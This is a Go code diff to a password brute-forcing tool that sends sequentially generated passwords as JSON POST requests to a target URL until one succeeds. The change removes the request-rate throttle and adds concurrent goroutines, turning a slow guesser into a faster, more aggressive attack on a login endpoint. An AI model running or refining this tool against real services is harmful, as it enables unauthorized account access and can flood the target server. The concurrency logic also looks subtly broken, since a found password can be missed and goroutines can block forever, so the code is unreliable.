@@ -7,19 +7,38 @@ import (
 	"os"
 	"strconv"
 	"strings"
-	"time"
 )
 
 func main() {
-	url, timesPerSecond := parseCmdArgs()
+	url, goroutineMaxNum := parseCmdArgs()
 	characters := getCharacters()
 	password := string(characters[0])
+
+	sem := make(chan struct{}, goroutineMaxNum)
+
 	for {
-		ok := tryPassword(url, password)
+		sem <- struct{}{}
+
+		okChan := make(chan bool)
+		go func(url, password string) {
+			ok := tryPassword(url, password)
+			if ok {
+				okChan <- true
+			}
+
+			<-sem
+		}(url, password)
+
+		ok := false
+		select {
+		case <-okChan:
+			ok = true
+		default:
+		}
 		if ok {
 			break
 		}
-		time.Sleep(time.Duration(1000/timesPerSecond) * time.Millisecond)
+
 		password = generateNextPassword(password, characters)
 	}
 }
@@ -52,11 +71,11 @@ func generateNextPassword(password string, characters []rune) string {
 func parseCmdArgs() (string, int) {
 	cmdArgs := os.Args[1:]
 	url := cmdArgs[0]
-	timesPerSecond, err := strconv.Atoi(cmdArgs[1])
+	goroutineMaxNum, err := strconv.Atoi(cmdArgs[1])
 	if err != nil {
 		panic(err)
 	}
-	return url, timesPerSecond
+	return url, goroutineMaxNum
 }
 
 func getCharacters() []rune {
@@ -88,11 +107,13 @@ func tryPassword(url, password string) bool {
 		panic(err)
 	}
 	body := bytes.NewBuffer(bodyJson)
-	print(url + ":" + body.String() + ":")
+
 	response, err := http.Post(url, "application/json", body)
-	println(response.StatusCode)
 	if err != nil {
 		panic(err)
 	}
+
+	println(url + " : " + string(bodyJson) + " : " + response.Status)
+
 	return response.StatusCode >= 200 && response.StatusCode <= 299
 }
